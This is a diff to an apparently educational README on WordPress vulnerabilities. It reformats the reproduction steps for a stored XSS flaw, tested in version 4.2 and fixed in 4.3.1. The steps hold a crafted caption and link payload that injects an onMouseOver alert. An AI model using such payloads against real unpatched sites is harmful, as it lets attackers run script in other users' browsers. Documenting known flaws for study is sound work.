@@ -12,7 +12,10 @@ Time spent: **X** hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.3.1
   - [x] GIF Walkthrough: <img src="XSS1.gif" width="800"> 
-  - [x] Steps to recreate: Navigate to the side navigation menu. Click "Posts", and make a new post. Add the following to the body: <p>XSS Test 1<figure style="width: 1px;" class="wp-caption alignnone"><figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href="http://onMouseOver='alert(1)'">Hover here</a></p>
+  - [x] Steps to recreate: Navigate to the side navigation menu. Click "Posts", and make a new post. Add the following to the body: 
+```
+  <p>XSS Test 1<figure style="width: 1px;" class="wp-caption alignnone"><figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href="http://onMouseOver='alert(1)'">Hover here</a></p>
+```
   - [x] Affected source code:
     - [Link 1](https://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/)
 
